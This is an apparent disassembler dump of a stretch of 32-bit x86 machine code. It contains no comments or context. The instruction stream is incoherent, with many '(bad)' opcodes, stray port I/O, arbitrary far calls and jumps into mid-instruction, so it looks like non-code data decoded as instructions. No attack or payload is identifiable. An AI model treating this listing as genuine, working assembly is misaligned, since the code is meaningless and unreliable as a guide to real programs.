  69651f:	or     DWORD PTR [ecx],esp
  696521:	das    
  696522:	sar    al,1
  696524:	sar    esp,1
  696526:	popf   
  696527:	mov    eax,ds:0x7b620448
  69652c:	cmp    BYTE PTR [edx],0x24
  69652f:	push   ss
  696530:	test   al,0xaf
  696532:	ins    DWORD PTR es:[edi],dx
  696533:	dec    ebx
  696534:	gs repz cmc 
  696537:	sbb    dh,BYTE PTR [esi+0x6e06aa8d]
  69653d:	fcmovnb st,st(5)
  69653f:	pop    esp
  696540:	outs   dx,DWORD PTR fs:[esi]
  696542:	mov    esp,0x70815a85
  696547:	pop    ebx
  696548:	mov    WORD PTR [esi],ds
  69654a:	cmp    eax,0x96691da6
  69654f:	xor    eax,0x54c1f8e1
  696554:	adc    DWORD PTR [ebx],esi
  696556:	int    0xc
  696558:	out    0xf2,al
  69655a:	jle    0x696596
  69655c:	cli    
  69655d:	sbb    cl,BYTE PTR [esi+0x58]
  696560:	sub    eax,0xbe20be2c
  696565:	push   0x70192b30
  69656a:	(bad)  
  69656b:	or     ah,ch
  69656d:	jge    0x696514
  69656f:	cmp    al,0xdf
  696571:	add    ebx,edi
  696573:	mov    ds:0x51a29316,eax
  696578:	mov    bl,BYTE PTR [ebx-0x25]
  69657b:	ret    0xaa36
  69657e:	call   0xdda69c7b
  696583:	lock ret 
  696585:	xchg   ebp,eax
  696586:	dec    ecx
  696587:	mov    ecx,0x276eb454
  69658c:	push   ax
  69658e:	lea    ebp,[esi]
  696590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  696591:	rcr    BYTE PTR [ecx+0x65],1
  696594:	mov    bl,0xac
  696596:	add    cl,BYTE PTR [edx]
  696598:	jmp    FWORD PTR es:[eax+0x56479d2d]
  69659f:	sub    dl,al
  6965a1:	test   al,0x71
  6965a3:	je     0x6965ed
  6965a5:	jno    0x69655c
  6965a7:	nop
  6965a8:	jecxz  0x6965e0
  6965aa:	inc    ebx
  6965ab:	ins    BYTE PTR es:[edi],dx
  6965ac:	not    BYTE PTR [ebx+0x373495f7]
  6965b2:	inc    eax
  6965b3:	int3   
  6965b4:	rcl    BYTE PTR [ebx+eax*2],1
  6965b7:	lods   eax,DWORD PTR ds:[esi]
  6965b8:	int3   
  6965b9:	rcl    BYTE PTR [esi+0x3e3a3611],1
  6965bf:	sbb    dl,bh
  6965c1:	push   es
  6965c2:	(bad)  
  6965c3:	call   0x9bb12aae
  6965c8:	pop    esp
  6965c9:	and    al,dl
  6965cb:	sub    DWORD PTR [ebx-0x28fd7d],esp
  6965d1:	jns    0x6965cd
  6965d3:	scas   al,BYTE PTR es:[edi]
  6965d4:	leave  
  6965d5:	mov    eax,ds:0x1f9874c8
  6965da:	cmc    
  6965db:	xchg   DWORD PTR [eax-0x6245175f],ebp
  6965e1:	mov    edx,0x3ed7f108
  6965e6:	(bad)  
  6965e7:	ins    DWORD PTR es:[edi],dx
  6965e8:	xor    dl,al
  6965ea:	push   ebx
  6965eb:	adc    al,0x9
  6965ed:	jae    0x69658c
  6965ef:	ja     0x69660c
  6965f1:	sub    eax,0x119c5467
  6965f6:	ds repz mov ch,0xea
  6965fa:	fstp   QWORD PTR [ecx+eiz*2-0x65]
  6965fe:	pusha  
  6965ff:	xchg   BYTE PTR [edi+eiz*2],ch
  696602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  696603:	inc    esi
  696604:	or     BYTE PTR [ebp+0x77],dl
  696607:	les    eax,FWORD PTR [ebx+edx*2+0x759d7091]
  69660e:	fst    DWORD PTR [ecx+0x7b]
  696611:	inc    edx
  696612:	pop    es
  696613:	sub    esp,ecx
  696615:	dec    esi
  696616:	hlt    
  696617:	test   eax,0x996ebd56
  69661c:	inc    edi
  69661d:	push   es
  69661e:	mov    esi,0xee2f1739
  696623:	fild   QWORD PTR [esi]
  696625:	lea    edx,[ecx+eax*1+0x3b]
  696629:	lds    edx,FWORD PTR [ecx]
  69662b:	in     al,0x3b
  69662d:	in     eax,0x70
  69662f:	test   ebp,edi
  696631:	fisttp WORD PTR [ecx]
  696633:	lods   eax,DWORD PTR ds:[esi]
  696634:	xchg   esi,edx
  696636:	mov    bl,bl
  696638:	lods   eax,DWORD PTR ds:[esi]
  696639:	aad    0xd0
  69663b:	nop
  69663c:	add    DWORD PTR [ebx+ebp*1],eax
  69663f:	call   FWORD PTR gs:[eax]
  696642:	sub    BYTE PTR [edi-0x505a34b0],dh
  696648:	icebp  
  696649:	pop    ss
  69664a:	adc    eax,0x6216e661
  69664f:	adc    BYTE PTR [esi+0x3c75a81b],ah
  696655:	mov    cl,0x35
  696657:	aas    
  696658:	jge    0x696682
  69665a:	cmp    al,0x39
  69665c:	sub    al,BYTE PTR [esi+0x43]
  69665f:	dec    eax
  696660:	mov    ebp,0x407676b9
  696665:	nop
  696666:	stos   DWORD PTR es:[edi],eax
  696667:	sub    esi,DWORD PTR [edx]
  696669:	mov    ecx,0x3ef338d4
  69666e:	leave  
  69666f:	xchg   ch,cl
  696671:	sub    BYTE PTR [ebp-0x7c99d506],dl
  696677:	cmp    edx,DWORD PTR [esi+0xd76362d]
  69667d:	call   0x101aae27
  696682:	jge    0x696684
  696684:	mov    bl,0xf2
  696686:	cmp    ah,BYTE PTR [ebp+eax*4-0x24]
  69668a:	and    DWORD PTR [esp+eax*4+0x65],eax
  69668e:	std    
  69668f:	jbe    0x696697
  696691:	push   edi
  696692:	stos   BYTE PTR es:[edi],al
  696693:	icebp  
  696694:	les    ecx,FWORD PTR [ecx]
  696696:	fucomi st,st(7)
  696698:	ror    BYTE PTR [esi-0x1dd3f05a],cl
  69669e:	push   ebx
  69669f:	jo     0x696694
  6966a1:	push   0x33
  6966a3:	sub    BYTE PTR [eax+0x74531929],cl
  6966a9:	adc    dl,BYTE PTR [eax+ecx*2+0x1d8bbe8a]
  6966b0:	add    edi,DWORD PTR [ecx+0x4a96a542]
  6966b6:	adc    DWORD PTR [edi],ecx
  6966b8:	cmp    edi,DWORD PTR [edx-0x80]
  6966bb:	shl    DWORD PTR [edi+0x26608ff1],0x34
  6966c2:	in     al,0x38
  6966c4:	dec    edx
  6966c5:	aam    0xcb
  6966c7:	shl    DWORD PTR [ebx-0x29],0x35
  6966cb:	fwait
  6966cc:	out    dx,eax
  6966cd:	mov    ah,0x51
  6966cf:	jle    0x6966ce
  6966d1:	mov    ecx,0x9b9ec0e1
  6966d6:	mov    dl,0xb7
  6966d8:	scas   eax,DWORD PTR es:[edi]
  6966d9:	cmp    BYTE PTR [eax+0x6a],bh
  6966dc:	cld    
  6966dd:	sbb    bh,BYTE PTR [ecx+0x33377d7c]
  6966e3:	pop    edi
  6966e4:	adc    esp,DWORD PTR [edi]
  6966e6:	push   esp
  6966e7:	mov    WORD PTR [eax],fs
  6966e9:	jecxz  0x696720
  6966eb:	mul    DWORD PTR [edx+eiz*8-0x37a42ff2]
  6966f2:	pop    esp
  6966f3:	add    DWORD PTR [eax+0x2c],esi
  6966f6:	data16 (bad) 
  6966f8:	sub    eax,0x754f5225
  6966fd:	push   ecx
  6966fe:	call   0x563f:0xa735ab44
  696705:	push   esi
  696706:	inc    esp
  696707:	shl    edx,0xc5
  69670a:	jb     0x696787
  69670c:	sbb    esp,ebx
  69670e:	and    bh,BYTE PTR [esi]
  696710:	jg     0x6966ed
  696712:	repnz inc eax
  696714:	and    ah,BYTE PTR [eax]
  696716:	mov    cl,0xae
  696718:	jne    0x6966d9
  69671a:	mov    esp,0x2db79624
  69671f:	jle    0x696744
  696721:	ja     0x696780
  696723:	mov    esp,0x6a6fdd18
  696728:	in     al,0xcf
  69672a:	push   esi
  69672b:	sar    ch,0xf7
  69672e:	jecxz  0x696763
  696730:	adc    BYTE PTR [ebx+0x71ab97b9],ah
  696736:	ins    BYTE PTR es:[edi],dx
  696737:	jns    0x6967b3
  696739:	dec    eax
  69673a:	scas   eax,DWORD PTR es:[edi]
  69673b:	sbb    BYTE PTR [edi+0x28],dh
  69673e:	bound  ebx,QWORD PTR [esi]
  696740:	out    dx,eax
  696741:	aaa    
  696742:	in     eax,dx
  696743:	push   es
  696744:	sbb    esi,DWORD PTR ds:0x3b959017
  69674a:	add    al,0xe0
  69674c:	scas   eax,DWORD PTR es:[edi]
  69674d:	retf   0xc63a
  696750:	pop    edi
  696751:	stc    
  696752:	pop    edx
  696753:	aam    0x92
  696755:	or     eax,0x700959cb
  69675a:	mov    WORD PTR [edx],ss
  69675c:	scas   eax,DWORD PTR es:[edi]
  69675d:	or     eax,eax
  69675f:	ins    BYTE PTR es:[edi],dx
  696760:	lods   eax,DWORD PTR ds:[esi]
  696761:	sysexit 
  696763:	loope  0x696759
  696765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  696766:	lds    eax,FWORD PTR [ecx+0x6cd9d0b8]
  69676c:	sar    BYTE PTR [edi+0x3533ff2],0x91
  696773:	retf   0x1207
  696776:	cmp    DWORD PTR [ebp+esi*1-0x5f5b5631],0xffffffb5
  69677e:	std    
  69677f:	dec    edx
  696780:	xchg   esp,eax
  696781:	jmp    0xfe636353
  696786:	int3   
  696787:	test   edi,esp
  696789:	pusha  
  69678a:	sub    DWORD PTR [edx],ebx
  69678c:	and    esp,DWORD PTR [edx+0x2e]
  69678f:	and    DWORD PTR [ebx+0x43fb2bf8],edx
  696795:	fnstenv [eax-0x2e]
  696798:	sub    BYTE PTR [edi+0x4462e861],dl
  69679e:	imul   ecx,DWORD PTR [eax+0x607933b4],0x62881be5
  6967a8:	rcl    DWORD PTR [edi],cl
  6967aa:	call   FWORD PTR [eax+esi*8-0x53c15da0]
  6967b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6967b2:	ret    
  6967b3:	fstp   QWORD PTR [ebp-0x75]
  6967b6:	call   FWORD PTR [eax+0x7d923461]
  6967bc:	sahf   
  6967bd:	enter  0xb720,0x11
  6967c1:	and    ecx,DWORD PTR [edi]
  6967c3:	stos   DWORD PTR es:[edi],eax
  6967c4:	add    esi,ecx
  6967c6:	dec    ebx
  6967c7:	repz call 0x28f445f1
  6967cd:	in     al,0x93
  6967cf:	mov    esi,0xb1bfea79
  6967d4:	adc    al,0xce
  6967d6:	add    al,0xb1
  6967d8:	add    ebp,ebp
  6967da:	mov    dh,0x50
  6967dc:	jge    0x696761
  6967de:	mov    ah,0x45
  6967e0:	push   edx
  6967e1:	outs   dx,DWORD PTR ds:[esi]
  6967e2:	stos   BYTE PTR es:[edi],al
  6967e3:	pop    ecx
  6967e4:	imul   edi,edi,0x28
  6967e7:	pop    esi
  6967e8:	outs   dx,BYTE PTR ds:[esi]
  6967e9:	sub    BYTE PTR ds:0x6b60e6f9,ah
  6967ef:	clc    
  6967f0:	jae    0x696804
  6967f2:	cmp    eax,DWORD PTR [ecx+0x76]
  6967f5:	xor    bl,dl
  6967f7:	(bad)
  6967fa:	out    dx,al
  6967fb:	sbb    DWORD PTR [ecx],esi
  6967fd:	inc    edx
  6967fe:	hlt    
  6967ff:	into   
  696800:	adc    ah,BYTE PTR [ecx+0xf]
  696803:	push   ebx
  696804:	aas    
  696805:	cdq    
  696806:	adc    eax,DWORD PTR [ebp-0x47]
  696809:	bnd je 0x69685f
  69680c:	into   
  69680d:	or     edi,DWORD PTR [edx-0x6a4529d4]
  696813:	xchg   edx,eax
  696814:	cmp    cl,BYTE PTR [edx-0x5c]
  696817:	push   0xfb2464ed
  69681c:	inc    eax
  69681d:	imul   eax,DWORD PTR [ecx+0x4],0xa4ec1c8c
  696824:	jae    0x69685f
  696826:	out    dx,eax
  696827:	es push cs
  696829:	sub    BYTE PTR [edi+0x50],al
  69682c:	xlat   BYTE PTR ds:[ebx]
  69682d:	jl     0x69682e
  69682f:	jae    0x6967c5
  696831:	stos   BYTE PTR es:[edi],al
  696832:	mov    ebx,0x5c4571f1
  696837:	shr    DWORD PTR [ebp+eax*2-0x2f],cl
  69683b:	into   
  69683c:	pop    ds
  69683d:	shl    BYTE PTR ds:0x11ecbfc4,1
  696843:	mov    edx,0xe7c2f356
  696848:	stos   BYTE PTR es:[edi],al
  696849:	call   0xe9f8:0xb136608c
  696850:	sub    DWORD PTR [ebp-0x41],esi
  696853:	mov    cs,WORD PTR [eax+0x19]
  696856:	cmp    al,0xe2
  696858:	dec    edx
  696859:	mov    ah,0xb1
  69685b:	jo     0x69684a
  69685d:	jne    0x696818
  69685f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  696860:	or     bh,bl
  696862:	jg     0x6967ee
  696864:	jp     0x6968bc
  696866:	pop    ecx
  696867:	mov    al,0xc1
  696869:	pop    ds
  69686a:	icebp  
  69686b:	mov    eax,ds:0x7ec471a4
  696870:	sub    eax,0x9542dd44
  696875:	retf   0xa088
  696878:	and    bl,ch
  69687a:	jb     0x69681a
  69687c:	test   al,0x64
  69687e:	sub    eax,esi
  696880:	cmp    ebp,esi
  696882:	scas   al,BYTE PTR es:[edi]
  696883:	sub    cl,BYTE PTR [ecx+0xab37991]
  696889:	inc    ebp
  69688a:	lds    edx,FWORD PTR [ebx]
  69688c:	pop    ebx
  69688d:	(bad)  
  69688e:	popa   
  69688f:	je     0x696870
  696891:	call   0xbe61e67a
  696896:	xor    al,0xc0
  696898:	je     0x6968ec
  69689a:	ja     0x69688b
  69689c:	clc    
  69689d:	mov    ch,0xd4
  69689f:	pusha  
  6968a0:	mov    al,bl
  6968a2:	push   ds
  6968a3:	dec    edi
  6968a4:	fstp   QWORD PTR [ebx+0x38]
  6968a7:	ins    BYTE PTR es:[edi],dx
  6968a8:	push   es
  6968a9:	ficom  WORD PTR [ebx-0x2e]
  6968ac:	add    ecx,DWORD PTR [edi]
  6968ae:	or     al,0xf9
  6968b0:	leave  
  6968b1:	and    dl,BYTE PTR [edx-0x11]
  6968b4:	enter  0x8a3c,0xb1
  6968b8:	int    0xcf
  6968ba:	sub    eax,0x15959978
  6968bf:	dec    eax
  6968c0:	cmp    al,0xf3
  6968c2:	idiv   DWORD PTR [eax+0x5d]
  6968c5:	mov    ebx,0x5535d0bd
  6968ca:	loopne 0x696850
  6968cc:	neg    BYTE PTR es:[edx-0x54]
  6968d0:	cmp    BYTE PTR [esi],0x64
  6968d3:	mov    ebx,0xb90fb538
  6968d8:	jne    0x6968c5
  6968da:	shr    DWORD PTR [eax+esi*2],cl
  6968dd:	fst    QWORD PTR [esi+0x4b7b580a]
  6968e3:	adc    BYTE PTR [ebp+0x2bd9a178],dh
  6968e9:	lahf   
  6968ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6968eb:	int3   
  6968ec:	ror    BYTE PTR [eax+0x60],cl
  6968ef:	lock in al,0x2c
  6968f2:	ja     0x6968b0
  6968f4:	push   es
  6968f5:	mov    ds:0x5601c033,eax
  6968fa:	mov    esi,0x460f5d74
  6968ff:	fstp   QWORD PTR [ebx+edx*8+0x7b4c43f6]
  696906:	mov    edx,eax
  696908:	lods   al,BYTE PTR ds:[esi]
  696909:	pop    esi
  69690a:	jo     0x6968f2
  69690c:	into   
  69690d:	or     edx,DWORD PTR [eax+0x5]
  696910:	(bad)  
  696911:	aaa    
  696912:	cmc    
  696913:	dec    ebp
  696914:	je     0x69696d
  696916:	mov    bh,0x9c
  696918:	ror    edi,1
  69691a:	popa   
  69691b:	leave  
  69691c:	push   edi
  69691d:	or     eax,0x9347626b
  696922:	fs lea esp,ds:[ebp-0x8702e38]
  69692a:	mov    ebp,0xf2cf5792
  696930:	inc    esi
  696931:	sub    al,0xf7
  696933:	adc    ebx,0x7c
  696936:	mov    edx,0xc73acc80
  69693b:	add    BYTE PTR [eax-0x6f],dl
  69693e:	jge    0x69693a
  696940:	scas   al,BYTE PTR es:[edi]
  696941:	or     ebp,DWORD PTR [ebp-0x32aed306]
  696947:	test   al,0x69
  696949:	jmp    0x696988
  69694b:	loopne 0x6969ad
  69694d:	js     0x69690a
  69694f:	aaa    
  696950:	ret    0x9e80
  696953:	cmp    ebp,DWORD PTR [ebp+0x36]
  696956:	xor    eax,DWORD PTR [edx+0x5270d4a0]
  69695c:	pop    fs
  69695e:	loopne 0x696920
  696960:	int3   
  696961:	jge    0x6969c7
  696963:	jae    0x6968e7
  696965:	pop    esi
  696966:	mov    al,ds:0xf2820b99
  69696b:	jmp    0x6321:0x510efeb4
  696972:	je     0x696915
  696974:	repz in eax,0x58
  696977:	pop    es
  696978:	clc    
  696979:	mov    ah,bh
  69697b:	push   0x27
  69697d:	inc    BYTE PTR [edx]
  69697f:	hlt    
  696980:	sub    DWORD PTR [esi],edx
  696982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  696983:	adc    cl,bl
  696985:	ret    
  696986:	jg     0x69696a
  696988:	sub    BYTE PTR [esi-0x3],0xf5
  69698c:	(bad)  
  69698d:	sti    
  69698e:	dec    edx
  69698f:	add    edi,DWORD PTR [ebp+0x698eaaaa]
  696995:	add    BYTE PTR [ebp-0x61],ah
  696998:	test   al,0x11
  69699a:	pop    edi
  69699b:	mov    esp,0xe8261102
  6969a0:	lods   eax,DWORD PTR ds:[esi]
  6969a1:	daa    
  6969a2:	bound  ebx,QWORD PTR [ecx-0x76c541e1]
  6969a8:	push   ss
  6969a9:	fld    TBYTE PTR [eax+0x79]
  6969ac:	or     al,0x3d
  6969ae:	or     ch,cl
  6969b0:	push   0x4c
  6969b2:	cmp    bh,BYTE PTR [ebx+0x77]
  6969b5:	lahf   
  6969b6:	bound  edx,QWORD PTR [edi-0x7b0a24fb]
  6969bc:	das    
  6969bd:	adc    bl,dh
  6969bf:	and    eax,0xac4504d6
  6969c4:	xor    BYTE PTR [esi+0x730c882b],cl
  6969ca:	cmp    BYTE PTR [edi-0x51],dh
  6969cd:	mov    bl,0xa9
  6969cf:	sub    al,0x57
  6969d1:	inc    edx
  6969d2:	mov    ebx,DWORD PTR [edx]
  6969d4:	dec    esp
  6969d5:	jmp    0xb43b:0xe0ed248a
  6969dc:	out    0xa3,al
  6969de:	mov    ecx,0x29006030
  6969e3:	sbb    BYTE PTR [eax-0x2eb2cbab],bh
  6969e9:	push   ss
  6969ea:	jnp    0x696a64
  6969ec:	cmp    ch,dl
  6969ee:	mov    ch,0x64
  6969f0:	scas   eax,DWORD PTR es:[edi]
  6969f1:	hlt    
  6969f2:	adc    al,0xb0
  6969f4:	adc    BYTE PTR [esi],bh
  6969f6:	lahf   
  6969f7:	dec    edi
  6969f8:	mov    cl,0x17
  6969fa:	ret    
  6969fb:	xlat   BYTE PTR ds:[ebx]
  6969fc:	into   
  6969fd:	scas   eax,DWORD PTR es:[edi]
  6969fe:	loop   0x696a02
  696a00:	fs inc edi
  696a02:	aam    0x77
  696a04:	mov    dh,0x5c
  696a06:	(bad)  
  696a07:	push   ds
  696a08:	xchg   esp,eax
  696a09:	hlt    
  696a0a:	cmp    BYTE PTR [eax],bh
  696a0c:	in     eax,0xbd
  696a0e:	pop    ss
  696a0f:	(bad)  
  696a10:	call   0xbf46:0xdf40a098
  696a17:	sbb    al,0x27
  696a19:	dec    eax
  696a1a:	adc    eax,0xef38285c
  696a1f:	adc    esp,DWORD PTR [ecx+0x653d2deb]
  696a25:	outs   dx,BYTE PTR ds:[esi]
  696a26:	scas   al,BYTE PTR es:[edi]
  696a27:	shl    eax,0x86
  696a2a:	ret    0xe0d5
  696a2d:	mov    edx,0xdc74d5d5
  696a32:	je     0x6969e3
  696a34:	call   FWORD PTR [edi]
  696a36:	nop
  696a37:	sahf   
  696a38:	push   DWORD PTR [ebx]
  696a3a:	enter  0xed8d,0xea
  696a3e:	out    0xaf,al
  696a40:	int3   
  696a41:	jl     0x696a37
  696a43:	neg    DWORD PTR [ebx]
  696a45:	inc    esp
  696a46:	mov    ebp,0xd9e1954d
  696a4b:	sbb    eax,0x86aafd55
  696a50:	ret    
  696a51:	and    al,BYTE PTR [edx]
  696a53:	mov    bl,dl
  696a55:	pop    ebp
  696a56:	cmc    
  696a57:	ficom  WORD PTR [edi+0x778e7bd3]
  696a5d:	clc    
  696a5e:	ja     0x696a9e
  696a60:	xor    DWORD PTR [ebp+0x49],ecx
  696a63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  696a64:	out    dx,eax
  696a65:	inc    esi
  696a66:	out    0x54,eax
  696a68:	cmp    eax,0x7d4edd1
  696a6d:	ins    BYTE PTR es:[edi],dx
  696a6e:	cli    
  696a6f:	inc    ecx
  696a70:	mov    eax,ds:0xcb2b5c31
  696a75:	mov    al,0x1a
  696a77:	sti    
  696a78:	cdq    
  696a79:	call   0xf45e:0xb2641c73
  696a80:	sbb    eax,0x1f3ef16e
  696a85:	xor    al,0x5c
  696a87:	repz adc ch,BYTE PTR [ebx+0x8]
  696a8b:	mov    al,ds:0xa5e54904
  696a90:	cs pop esp
  696a92:	shl    BYTE PTR ds:0x3d832a41,1
  696a98:	xor    edi,eax
  696a9a:	out    0x36,eax
  696a9c:	ret    0x1fdf
  696a9f:	cmc    
  696aa0:	cmp    cl,BYTE PTR [edx]
  696aa2:	cmp    dh,BYTE PTR [esi+0x2f]
  696aa5:	test   al,0xf9
  696aa7:	repz pop edi
  696aa9:	sahf   
  696aaa:	and    al,0x88
  696aac:	mov    ?,edi
  696aae:	pop    ss
  696aaf:	outs   dx,DWORD PTR ds:[esi]
  696ab0:	push   ebp
  696ab1:	std    
  696ab2:	xchg   DWORD PTR [esi-0x34601dcd],ebx
  696ab8:	cmp    eax,0xa1a95c66
  696abd:	add    al,0x85
  696abf:	sbb    bl,BYTE PTR [ebx-0x6]
  696ac2:	fcmovb st,st(5)
  696ac4:	inc    ecx
  696ac5:	mov    bl,0xc4
  696ac7:	into   
  696ac8:	loop   0x696a90
  696aca:	out    0x6f,eax
  696acc:	jne    0x696b18
  696ace:	mov    ah,0xc2
  696ad0:	adc    ah,BYTE PTR [ecx+0x343752c6]
  696ad6:	and    ebx,ecx
  696ad8:	fs daa 
  696ada:	push   eax
  696adb:	js     0x696ab6
  696add:	mov    bl,0xdf
  696adf:	addr16 loopne 0x696ace
  696ae2:	jl     0x696b40
  696ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  696ae5:	push   esp
  696ae6:	leave  
  696ae7:	lds    eax,FWORD PTR [edi+ebx*2]
  696aea:	push   0x61
  696aec:	repz in eax,dx
  696aee:	lds    ebp,FWORD PTR [esi+edi*8]
  696af1:	(bad)  
  696af2:	xchg   ebx,eax
  696af3:	adc    esp,eax
  696af5:	or     DWORD PTR [ebp-0x29856d6d],esi
  696afb:	imul   edx,ebp,0x3f
  696afe:	rol    DWORD PTR [ebx],1
  696b00:	mov    ebx,0xa804501b
  696b05:	inc    eax
  696b06:	mov    edx,0x22ed3de4
  696b0b:	sbb    DWORD PTR [ecx-0x10c26ab4],esi
  696b11:	adc    eax,0x2360c6f2
  696b16:	stc    
  696b17:	fwait
  696b18:	mov    eax,0x22bfa166
  696b1d:	leave  
  696b1e:	cli    
  696b1f:	jne    0x696b70
  696b21:	adc    DWORD PTR [ebx+0x69],esi
  696b24:	sti    
  696b25:	mov    eax,ds:0x151e6bc2
  696b2a:	cmp    BYTE PTR gs:[esp+ebx*2-0x54],bh
  696b2f:	xchg   esp,eax
  696b30:	ss loopne 0x696af0
  696b33:	je     0x696ad6
  696b35:	out    0xc9,al
  696b37:	cmp    al,0xc8
  696b39:	or     DWORD PTR [ecx+0x41d12919],esp
  696b3f:	repnz fidivr WORD PTR [ebx+eax*2]
  696b43:	inc    ebp
  696b44:	jmp    0xea968e12
  696b49:	out    dx,eax
  696b4a:	rcl    ch,1
  696b4c:	(bad)  
  696b4d:	fcomp  DWORD PTR [edi+0x57]
  696b50:	fsub   DWORD PTR [ebp-0xa]
  696b53:	sub    ecx,DWORD PTR [ebp+0x5a2fdc58]
  696b59:	mov    bl,bl
  696b5b:	mov    ch,0xf1
  696b5d:	jno    0x696b55
  696b5f:	dec    ecx
  696b60:	xchg   DWORD PTR [eax+ebx*8],esi
  696b63:	inc    esp
  696b64:	sbb    DWORD PTR [edi],eax
  696b66:	sbb    BYTE PTR [esi-0x710abf31],0xcf
  696b6d:	xor    DWORD PTR [eax+0x32],0x8c38ad74
  696b74:	cmp    BYTE PTR [edx-0x33d8c63c],ah
  696b7a:	or     BYTE PTR [ecx],bl
  696b7c:	(bad)  
  696b7d:	cmp    eax,edx
  696b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  696b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  696b81:	call   0x4606e81b
  696b86:	mov    edi,0x8a39b215
  696b8b:	xor    DWORD PTR [edi-0x35532072],0x4f1268d7
  696b95:	mov    dl,0x4f
  696b97:	sub    BYTE PTR [ecx+ecx*4+0x697e0269],dh
  696b9e:	xchg   esi,eax
  696b9f:	pop    es
  696ba0:	pop    ds
  696ba1:	mov    al,0xd6
  696ba3:	dec    ecx
  696ba4:	cmp    bl,cl
  696ba6:	xchg   edx,eax
  696ba7:	(bad)  
  696ba8:	push   ebp
  696ba9:	je     0x696bb2
  696bab:	outs   dx,BYTE PTR ds:[esi]
  696bac:	jb     0x696b75
  696bae:	(bad)  
  696baf:	into   
  696bb0:	repnz xor ah,BYTE PTR [edx-0x3fba97fd]
  696bb7:	push   ebp
  696bb8:	out    dx,eax
  696bb9:	xlat   BYTE PTR ds:[ebx]
  696bba:	ss mov esp,0x3db17a3d
  696bc0:	dec    esp
  696bc1:	xor    BYTE PTR [edi],al
  696bc3:	pop    esp
  696bc4:	retf   0xc061
  696bc7:	shr    DWORD PTR [ebx-0x47],0x38
  696bcb:	outs   dx,BYTE PTR ds:[esi]
  696bcc:	pop    esi
  696bcd:	or     DWORD PTR [eax+0xc3d0b48],ecx
  696bd3:	popa   
  696bd4:	sbb    eax,0xe7953eda
  696bd9:	in     eax,dx
  696bda:	and    eax,0x420639e6
  696bdf:	sbb    DWORD PTR [ecx],edx
  696be1:	int3   
  696be2:	movq   mm3,QWORD PTR [ebx]
  696be5:	shl    DWORD PTR [esi-0x4cad27d],cl
  696beb:	add    edx,DWORD PTR [ecx]
  696bed:	cmp    dh,BYTE PTR [edi-0x406643d7]
  696bf3:	test   BYTE PTR [esi],dh
  696bf5:	sub    al,0x6c
  696bf7:	cld    
  696bf8:	lods   al,BYTE PTR ds:[esi]
  696bf9:	cli    
  696bfa:	into   
  696bfb:	or     eax,0xb1736b82
  696c00:	fcos   
  696c02:	jmp    0x696bc4
  696c04:	fwait
  696c05:	sar    BYTE PTR [ebp-0x152845c4],cl
  696c0b:	jno    0x696c13
  696c0d:	cmp    bl,BYTE PTR [edi+0x66]
  696c10:	sbb    ebp,DWORD PTR [ebx+eax*8]
  696c13:	mov    al,0xd
  696c16:	pop    ds
  696c17:	and    eax,DWORD PTR [ecx-0x13]
  696c1a:	adc    ebx,ecx
  696c1c:	inc    ecx
  696c1d:	jmp    0xe95b:0xcc876371
  696c24:	fidivr WORD PTR [edi]
  696c26:	add    al,0xc
  696c28:	mov    eax,ds:0x62fb9ee8
  696c2d:	dec    edi
  696c2e:	test   eax,0x4cab0a27
  696c33:	ror    DWORD PTR [ebx-0x1e664981],0xd6
  696c3a:	arpl   WORD PTR es:[ecx],si
  696c3d:	pop    es
  696c3e:	adc    dh,dh
  696c40:	sub    dl,BYTE PTR ds:0x54692b73
  696c46:	pop    ds
  696c47:	ret    
  696c48:	call   0x2b55:0xbf1a1cfe
  696c4f:	mov    ebp,0x53acc9a7
  696c54:	sbb    DWORD PTR [edx-0x34],ebx
  696c57:	add    dl,BYTE PTR [ecx-0x29]
  696c5a:	jne    0x696c63
  696c5c:	in     al,0xb7
  696c5e:	and    BYTE PTR ds:0x6dcb7544,dl
  696c64:	in     al,0x97
  696c66:	push   cs
  696c67:	arpl   bp,bp
  696c69:	or     al,0x62
  696c6b:	shl    esp,0x4e
  696c6e:	cmp    ch,BYTE PTR [ecx+0x399fe4d1]
  696c74:	ror    DWORD PTR [esi+0x2a902809],1
  696c7a:	inc    ecx
  696c7b:	imul   edi,esp,0xffffffb7
  696c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  696c7f:	cmc    
  696c80:	ud1    ecx,ebp
  696c83:	sub    cl,BYTE PTR [ebp-0x445ec2a0]
  696c89:	jnp    0x696c81
  696c8b:	fsubr  QWORD PTR [eax+0x7b]
  696c8e:	sub    bl,BYTE PTR [eax-0x1e60d5e2]
  696c94:	xchg   edx,eax
  696c95:	adc    al,0xd9
  696c97:	jnp    0x696ca3
  696c99:	mov    bh,0x4d
  696c9b:	sub    eax,0xe8592c46
  696ca0:	jmp    0xa77985aa
  696ca5:	add    DWORD PTR [edx],esp
  696ca7:	je     0x696d09
  696ca9:	xchg   esp,eax
  696caa:	sub    BYTE PTR [edx],0x75
  696cad:	int3   
  696cae:	and    edx,DWORD PTR [ebx-0x37e1539e]
  696cb4:	push   ebp
  696cb5:	test   al,0x34
  696cb7:	and    dl,al
  696cb9:	push   0x15
  696cbb:	arpl   WORD PTR [edi+ecx*2-0x7a],ax
  696cbf:	in     eax,dx
  696cc0:	rcl    ebp,0xbb
  696cc3:	cmp    esi,DWORD PTR [ebx+0x3639eddf]
  696cc9:	outs   dx,DWORD PTR ds:[esi]
  696cca:	outs   dx,DWORD PTR ds:[esi]
  696ccb:	pop    ebx
  696ccc:	(bad)  
  696ccf:	out    dx,al
  696cd0:	mov    ah,0x60
  696cd2:	popf   
  696cd3:	aam    0xf
  696cd5:	or     DWORD PTR [eax-0x76f9f6d2],esi
  696cdb:	cmp    DWORD PTR ds:0x46a7ec67,ebx
  696ce1:	idiv   BYTE PTR [ecx-0x72]
  696ce4:	icebp  
  696ce5:	or     dl,BYTE PTR [ebx-0x66]
  696ce8:	or     ebx,DWORD PTR [ebx+0x61]
